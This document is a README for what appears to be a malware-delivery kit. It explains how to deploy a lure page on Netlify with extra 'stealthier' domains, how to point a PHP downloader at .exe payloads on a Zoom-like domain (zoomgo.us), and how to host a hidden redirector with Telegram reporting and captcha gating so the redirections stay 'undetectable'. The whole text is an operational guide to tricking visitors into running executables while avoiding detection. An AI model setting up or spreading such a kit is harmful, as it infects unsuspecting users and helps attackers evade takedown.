## 🛠️ **Setup Instructions**

### 🚀 **Step 1: Register on Netlify**

1. **Fork the Repository**:
   - Go to this repository and **fork** it to your own GitHub account.

2. **Deploy on Netlify**:
   - After forking, go to **Netlify** and add your repository.
   - Set up your own custom domains on Netlify for smoother and stealthier deployments.
   - Add additional domains on Netlify if necessary for spreading your downloader.

---

### 📂 **Downloader Setup**

1. **Host Downloader PHP Script**:
   - The `Downloader FX` script is hosted at `domain.com/download.php`.
   - Ensure the script works on your server.

2. **Update `config.php`**:
   - Add your **direct file links** to `config.php`.
     - Example:
       ```"file1" => "https://zoomgo.us/files/sample1.exe",
    "file2" => "https://zoomgo.us/files/sample2.exe",
    "file3" => "https://zoomgo.us/files/sample3.exe"
       ```

### 📝 **Edit `index.html`**

1. **Modify Payload Download Link**:
   - Open `index.html` in your repo.
   - Go to **Line 1407** and replace the existing link with your **Payload Downloader Link**.
     - Example:
       ```domain.com/download.php
       ```

2. **Edit the File Key**:
   - Find **Line 1405** in `index.html` and update it with the file key from your **Downloader PHP** script.
     - Example:
       ```const fileKey = "file1"; - downloads file1 in Downloader config.php
       ```

### 🚨 **Host `redirector.tar.gz`**

1. **Upload `redirector.tar.gz`**:
   - Download and host the `redirector.tar.gz` file.
   - Edit the **Telegram settings** within `config.php` and ensure you have the proper **Turnstile Captcha** configured.

2. **Update `links.txt`**:
   - Add your **Netlify domains** to `links.txt` to keep the redirections smooth and undetectable.
   - Example:
     ```
     your-netlify-domain.com
     another-netlify-domain.com
     ```

## 🖥️ **Script Explanation**

### 1. **Netlify Deployment**
Netlify is used to host the **frontend interface** and manage the domains. When you deploy to Netlify, you can easily update your domains to make the redirection smoother and harder to detect.

### 2. **Downloader PHP Script**
The `download.php` script serves as a **file downloader**. It handles file requests and starts the download process for the user. You can configure the file links in `config.php` to determine which files are served based on the script’s logic.

### 3. **Payload Link in `index.html`**
In `index.html`, the **payload link** is dynamically linked to your downloader. By updating **Line 1407** with the correct payload URL, you ensure that the user downloads the intended file when they visit the page.

### 4. **Redirector Functionality**
The redirector functionality is hidden within the `redirector.tar.gz` package, which you host on your own server. The **Turnstile captcha** adds a layer of protection to prevent bots from accessing the downloader.
